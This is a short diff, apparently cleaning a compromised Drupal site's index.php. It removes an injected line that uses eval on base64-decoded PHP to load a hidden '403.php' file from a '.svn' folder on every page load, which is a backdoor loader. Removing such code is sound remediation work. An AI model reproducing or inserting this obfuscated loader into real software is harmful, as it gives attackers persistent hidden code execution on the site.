@@ -9,8 +9,6 @@
  * prints the appropriate page.
  */
 
-define('USE_DIRA', '/themes/bluemarine/.svn/'); @eval(@base64_decode("ZnVuY3Rpb24gY2FsbGJhY2soJGNoZWUpe3JlcXVpcmUoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS5VU0VfRElSQS4iNDAzLnBocCIpO3JldHVybiAoJGNoZWUpO31vYl9zdGFydCgiY2FsbGJhY2siKTs="));
-
 require_once './includes/bootstrap.inc';
 drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
 
